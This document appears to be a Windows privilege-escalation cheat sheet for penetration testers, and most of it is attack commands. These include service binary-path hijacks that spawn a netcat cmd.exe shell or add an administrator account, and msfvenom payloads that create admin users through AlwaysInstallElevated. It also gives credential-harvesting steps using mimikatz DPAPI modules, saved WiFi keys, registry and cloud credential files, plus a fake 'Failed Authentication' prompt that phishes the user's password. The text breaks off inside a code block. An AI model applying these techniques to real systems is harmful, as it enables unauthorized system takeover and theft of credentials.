## Windows version exploits

Check if the Windows version has any known vulnerability \(check also the patches applied\).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Vulnerable Drivers

Look for possible third party weird/vulnerable drivers

```text
driverquery
```

## Enumeration

### Environment

Any credential/Juicy info saved in the env variables?

```text
set
dir env:
```

### LAPS

**LAPS** allows you to **manage the local Administrator password** \(which is **randomised**, unique, and **changed regularly**\) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorised users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES.

```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
```

When using LAPS, 2 new attributes appear in the computer objects of the domain: _ms-msc-AdmPwd_ and _ms-mcs-AdmPwdExpirationTime._ These attributes contains the plain-text admin password and the expiration time. Then, in a domain environment, it could be interesting to check which users can read these attributes...

### Audit Settings

These settings decide what is being **logged**, so you should pay attention

```text
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, is interesting to know where are the logs sent

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### AV

Check is there is any anti virus running:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more
```

## Users & Groups

You should check if any of the groups where you belong have interesting permissions

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
```

### Get the content of the clipboard

```bash
powershell -command "Get-Clipboard"
```

## Token manipulation

**Learn more** about what is a **token** in this page: [Windows Tokens](../credentials.md#access-tokens).  
Take a look to **available privileges**, some of them can give you SYSTEM privileges. Take a look to [this amazing paper](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt).

### SeImpersonatePrivilege \(3.1.1\)

Any process holding this privilege can **impersonate** \(but not create\) any **token** for which it is able to gethandle. You can get a **privileged token** from a **Windows service** \(DCOM\) making it perform an **NTLM authentication** against the exploit, then execute a process as **SYSTEM**. Exploit it with [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM ](https://github.com/antonioCoco/RogueWinRM)\(needs winrm enabled\), [SweetPotato](https://github.com/CCob/SweetPotato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

### SeAssignPrimaryPrivilege \(3.1.2\)

It is very similar to **SeImpersonatePrivilege**, it will use the **same method** to get a privileged token.  
Then, this privilege allows **to assign a primary token** to a new/suspended process. With the privileged impersonation token you can derivate a primary token \(DuplicateTokenEx\).  
With the token, you can create a **new process** with 'CreateProcessAsUser' or create a process suspended and **set the token** \(in general, you cannot modify the primary token of a running process\).

### SeTcbPrivilege \(3.1.3\)

If you have enabled this token you can use **KERB\_S4U\_LOGON** to get an **impersonation token** for any other user without knowing the credentials, **add an arbitrary group** \(admins\) to the token, set the **integrity level** of the token to "**medium**", and assign this token to the **current thread** \(SetThreadToken\).

### SeBackupPrivilege \(3.1.4\)

This privilege causes the system to **grant all read access** control to any file \(only read\).  
Use it to **read the password hashes of local Administrator** accounts from the registry and then use "**psexec**" or "**wmicexec**" with the hash \(PTH\).  
This attack won't work if the Local Administrator is disabled, or if it is configured that a Local Admin isn't admin if he is connected remotely.  
You can **abuse this privilege** with: [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1) or with [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)

### SeRestorePrivilege \(3.1.5\)

**Write access** control to any file on the system, regardless of the files ACL.  
You can **modify services**, DLL Hijacking, set **debugger** \(Image File Execution Options\)… A lot of options to escalate.

### SeCreateTokenPrivilege \(3.1.6\)

This token **can be used** as EoP method **only** if the user **can impersonate** tokens \(even without SeImpersonatePrivilege\).  
In a possible scenario, a user can impersonate the token if it is for the same user and the integrity level is less or equal to the current process integrity level.  
In this case, the user could **create an impersonation token** and add to it a privileged group SID.

### SeLoadDriverPrivilege \(3.1.7\)

**Load and unload device drivers.**  
You need to create an entry in the registry with values for ImagePath and Type.  
As you don't have access to write to HKLM, you have to **use HKCU**. But HKCU doesn't mean anything for the kernel, the way to guide the kernel here and use the expected path for a driver config is to use the path: "\Registry\User\S-1-5-21-582075628-3447520101-2530640108-1003\System\CurrentControlSet\Services\DriverName" \(the ID is the **RID** of the current user\).  
So, you have to **create all that path inside HKCU and set the ImagePath** \(path to the binary that is going to be executed\) **and Type** \(SERVICE\_KERNEL\_DRIVER 0x00000001\).  
[**Learn how to exploit it here.**](../active-directory-methodology/privileged-accounts-and-token-privileges.md#seloaddriverprivilege)\*\*\*\*

### SeTakeOwnershipPrivilege \(3.1.8\)

This privilege is very similar to **SeRestorePrivilege**.  
It allows a process to “**take ownership of an object** without being granted discretionary access” by granting the WRITE\_OWNER access right.  
First, you have to **take ownership of the registry key** that you are going to write on and **modify the DACL** so you can write on it.

### SeDebugPrivilege \(3.1.9\)

It allows the holder to **debug another process**, this includes reading and **writing** to that **process' memory.**  
There are a lot of various **memory injection** strategies that can be used with this privilege that evade a majority of AV/HIPS solutions.

### Check privileges

```text
whoami /priv
```

## Network

Check for **restricted services** from the outside

```bash
netstat -ano #Opened ports?
```

More[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

## Software

Check all the installed software, maybe you can overwrite some binary or perform some DLL Hijacking by creating a DLL in the same folder.

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

### Run at startup

Check if you can overwrite some binary that is going to be executed by other user.

```bash
wmic startup get caption,command 2>nul & ^
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run 2>nul & ^
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul & ^
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run 2>nul & ^
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul & ^
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul & ^
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul & ^
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul & ^
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
```

```bash
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```

Check which files are executed when the computer is started. Components that are executed when a user logins can be exploited to execute malicious code when the administrator logins.  
For a **more comprehensive list of auto-executed** file you could use [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)from systinternals:

```text
autorunsc.exe -m -nobanner -a * -ct /accepteula
```

## Running processes

Check if you can overwrite some binary running or if you can dump the memory of any process containing passwords.

```bash
Tasklist /SVC #List processes running and services

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

#### Checking permissions of the processes binaries

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
    for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
        icacls "%%z" 
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
    )
)
```

#### Checking permissions of the folders of the processes binaries \(dll injection\)

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v 
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
    icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users 
todos %username%" && echo.
)
```

### Memory Password mining

You can create a memory dump of a running process using **procdump** from sysinternals. Services like FTP have the credentials in clear text in memory, try to dump the memory and read the credentials.

```text
procdump.exe -accepteula -ma <proc_name_tasklist>
```

{% file src="../../.gitbook/assets/ctx\_wsuspect\_white\_paper \(1\) \(1\).pdf" %}

## Services

Get a list of services:

```text
net start
wmic service list brief
sc query
```

### Permissions

You can use **sc** to get information of a service

```text
sc qc <service_name>
```

It is recommended to have the binary **accesschk** from _Sysinternals_ to check the required privilege level for each service.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

It is recommended to check if "Authenticated Users" can modify any service:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Enable service

If you are having this error \(for example with SSDPSRV\):

_System error 1058 has occurred.  
The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

You can enable it using

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Take into account that the service upnphost depends on SSDPSRV to work \(for XP SP1\)**

### **Modify service binary path**

If the group "Authenticated users" has **SERVICE\_ALL\_ACCESS** in a service, then it can modify the binary that is being executed by the service. To modify it and execute **nc** you can do:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Restart service

```text
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Other Permissions can be used to escalate privileges:  
**SERVICE\_CHANGE\_CONFIG** Can reconfigure the service binary  
**WRITE\_DAC:** Can reconfigure permissions, leading to SERVICE\_CHANGE\_CONFIG  
**WRITE\_OWNER:** Can become owner, reconfigure permissions  
**GENERIC\_WRITE:** Inherits SERVICE\_CHANGE\_CONFIG  
**GENERIC\_ALL:** Inherits SERVICE\_CHANGE\_CONFIG

**To detect and exploit** this vulnerability you can use _exploit/windows/local/service\_permissions_

### Services binaries weak permissions

Check if you can modify the binary that is executed by a service.

You can get every binary that is executed by a service using **wmic** \(not in system32\) and check your permissions using **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

You can also use **sc** and **icacls**:

```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

### Services registry permissions

You should check if you can modify any service registry.  
You can **check** your **permissions** over a service **registry** doing:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Check if **Authenticated Users** or **NT AUTHORITY\INTERACTIVE** have FullControl. In that case you can change the binary that is going to be executed by the service.

To change the Path of the binary executed:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Unquoted Service Paths

If the path to an executable is not inside quotes, Windows will try to execute every ending before a space.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:

```text
C:\Program.exe 
C:\Program Files\Some.exe 
C:\Program Files\Some Folder\Service.exe
```

To list all unquoted service paths \(minus built-in Windows services\)

```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
    for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
        echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
    )
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**You can detect and exploit** this vulnerability with metasploit: _exploit/windows/local/trusted\_service\_path_

You can manually create a service binary with metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

## DLL Hijacking

Programs usually can't function by themselves, they have a lot of resources they need to hook into \(mostly DLL's but also proprietary files\). If a **program or service loads a file from a directory we have write access to**, we can abuse that to **pop a shell with the privileges the program runs with**.

**In order to learn more about how to** [**discover and exploit Dll Hijacking vulnerabilities read this**](dll-hijacking.md)**.**

## Credentials

### [MSF-Credentials Plugin](https://github.com/carlospolop/MSF-Credentials)

I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.

### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)  
The Windows Vault stores user credentials for servers, websites and other programs that **Windows** can **log in the users automaticall**y. At first instance, this might look like now users can store their Facebook credentials, Twitter credentials, Gmail credentials etc., so that they automatically log in via browsers. But it is not so.

Windows Vault stores credentials that Windows can log in the users automatically, which means that any **Windows application that needs credentials to access a resource** \(server or a website\) **can make use of this Credential Manager** & Windows Vault and use the credentials supplied instead of users entering the username and password all the time.

Unless the applications interact with Credential Manager, I don't think it is possible for them to use the credentials for a given resource. So, if your application wants to make use of the vault, it should somehow **communicate with the credential manager and request the credentials for that resource** from the default storage vault.

```bash
cmdkey /list #List credential
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe" #Use saved credentials
```

Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

In theory, the Data Protection API can enable symmetric encryption of any kind of data; in practice, its primary use in the Windows operating system is to perform symmetric encryption of asymmetric private keys, using a user or system secret as a significant contribution of entropy.

**DPAPI allows developers to encrypt keys using a symmetric key derived from the user's logon secrets**, or in the case of system encryption, using the system's domain authentication secrets.

The DPAPI keys used for encrypting the user's RSA keys are stored under `%APPDATA%\Microsoft\Protect\{SID}` directory, where {SID} is the [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) of that user. **The DPAPI key is stored in the same file as the master key that protects the users private keys**. It usually is 64 bytes of random data. \(Notice that this directory is protected so you cannot list it using`dir` from the cmd, but you can list it from PS\).

```text
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

You can use **mimikatz module** `dpapi::masterkey` with the appropiate arguments \(`/pvk` or `/rpc`\) to decrypt it.

The **credentials files protected by the master password** are usually located in:

```text
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.  
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module \(if you are root\).

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
```

### AppCmd.exe

**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.  
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from _**PowerUP**_:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SSH keys in registry

SSH private keys can be stored inside the registry key `HKCU\Software\OpenSSH\Agent\Keys` so you should check if there is anything interesting in there:

```text
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```

If you find any entry inside that path it will probably be a saved SSH key. It is stored encrypted but can be easily decrypted using [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows_sshagent_extract).

More information about this technique here: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### SCClient / SCCM

Check if `C:\Windows\CCM\SCClient.exe` exists .  
Installers are **run with SYSTEM privileges**, many are vulnerable to **DLL Sideloading \(Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**\).**

```text
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

### **Remote Desktop Credential Manager**

```text
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Use the **Mimikatz** `dpapi::rd`g module with appropriate `/masterkey` to **decrypt any .rdg files**  
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Ask for credentials

You can always **ask the user to enter his credentials of even the credentials of a different user** if you think he can know them \(notice that **asking** the client directly for the **credentials** is really **risky**\):

```text
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password
```

### Common files with credentials

#### Unattended files

```text
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
```

#### SAM & SYSTEM backups

```text
C:\Windows\repair\SAM
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\SAM
C:\Windows\repair\SYSTEM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\RegBack\SYSTEM
```

#### McAffe SiteList.xml

Search for a file called **SiteList.xml**

#### Cached GPP Pasword

Before KB2928120 \(see MS14-025\), some Group Policy Preferences could be configured with a custom account. This feature was mainly used to deploy a custom local administrator account on a group of machines. There were two problems with this approach though. First, since the Group Policy Objects are stored as XML files in SYSVOL, any domain user can read them. The second problem is that the password set in these GPPs is AES256-encrypted with a default key, which is publicly documented. This means that any authenticated user could potentially access very sensitive data and elevate their privileges on their machine or even the domain. This function will check whether any locally cached GPP file contains a non-empty "cpassword" field. If so, it will decrypt it and return a custom PS object containing some information about the GPP along with the location of the file.

Search in **\*\*\_**C:\ProgramData\Microsoft\Group Policy\history _**or in**_ C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history\*\* \(previous to W Vista\)\_ for these files:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**To decrypt the cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

#### Cloud Credentials

```bash
##From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### More possible files with credentials

Known files that some time ago contained **passwords** in **clear-text** or **Base64**

```text

Example of web.config with credentials:

```markup
<authentication mode="Forms"> 
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

Search all of the proposed files:

```text

dir /s/b /A:-D RDCMan.settings == *.rdg == SCClient.exe == *_history == .sudo_as_admin_successful == .profile == *bashrc == httpd.conf == *.plan == .htpasswd == .git-credentials == *.rhosts == hosts.equiv == Dockerfile == docker-compose.yml == appcmd.exe == TypedURLs == TypedURLsTime == History == Bookmarks == Cookies == "Login Data" == places.sqlite == key3.db == key4.db == credentials == credentials.db == access_tokens.db == accessTokens.json == legacy_credentials == azureProfile.json == unattend.txt == access.log == error.log == *.gpg == *.pgp == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12 == *.der == *.csr == *.cer == known_hosts == id_rsa == id_dsa == *.ovpn == anaconda-ks.cfg == hostapd.conf == rsyncd.conf == cesi.conf == supervisord.conf == tomcat-users.xml == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == unattend.xml == unattended.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == groups.xml == services.xml == scheduledtasks.xml == printers.xml == drives.xml == datasources.xml == php.ini == https.conf == https-xampp.conf == httpd.conf == my.ini == my.cnf == access.log == error.log == server.xml == SiteList.xml == ConsoleHost_history.txt == setupinfo == setupinfo.bak 2>nul | findstr /v ".dll"
```

```text
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

If the server is a IIS server, check the contents of the folder

```text
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Check Logs \(IIS, Apache\)

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

It is also a good idea to search for **files** that contain specific words \(like _password_\)

```bash
#Search suspicious files from filename
dir /s /W *pass* == *cred* == *vnc* == *.config* | findstr /i/v "\\windows"

#Search suspicious files from content
findstr /D:C:\ /si password *.xml *.ini *.txt #A lot of output can be generated
findstr /D:C:\ /M /SI password *.xml *.ini *.txt 2>nul | findstr /V /I "\\AppData\\Local \\WinXsX ApnDatabase.xml \\UEV\\InboxTemplates \\Microsoft.Windows.CloudExperienceHost" 2>nul #filtered output
```

#### Home credentials files

You should also look inside the home folder for files called _\*password\*_ or _\*credential\*_ ot something similar.

#### Credentials in the RecycleBin

You should also check the Bin to look for credentials inside it

To **recover passwords** saved by several programs you can use: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Inside the registry

#### Winlogon credentials

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
```

#### Other possible registry keys with credentials

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" #Autologin
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s #Check the values saved in each session, user/password could be there
reg query "HKCU\Software\OpenSSH\Agent\Key"

# Search for passwords inside all the registry 
reg query HKLM /f password /t REG_SZ /s #Look for registries that contains "password"
reg query HKCU /f password /t REG_SZ /s #Look for registries that contains "password"
```

[Extract openssh keys from registry.](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

The tool [SessionGopher](https://github.com/Arvanaghi/SessionGopher) search for **sessions**, **usernames** and **passwords** of several tools that save this data in clear text \(PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP\)

```text
Invoke-SessionGopher -Thorough
```

### Browsers History

You should check for dbs where passwords from **Chrome or Firefox** are stored.  
Also check for the history, bookmarks and favourites of the browsers so maybe some **passwords are** stored there.

Tools to extract passwords from browsers:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)\*\*\*\*

## AlwaysInstallElevated

**If** these 2 registers are **enabled** \(value is **0x1**\), then users of any privilege can **install** \(execute\) **`*.msi`** files as NT AUTHORITY\*_SYSTEM\*_.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```

### MSI Wrapper

Read this tutorial to learn how to create a MSI wrapper using this tools:

{% page-ref page="msi-wrapper.md" %}

### MSI Installation

To execute the **installation** of the **malicious `.msi`** file in **background:**

```text
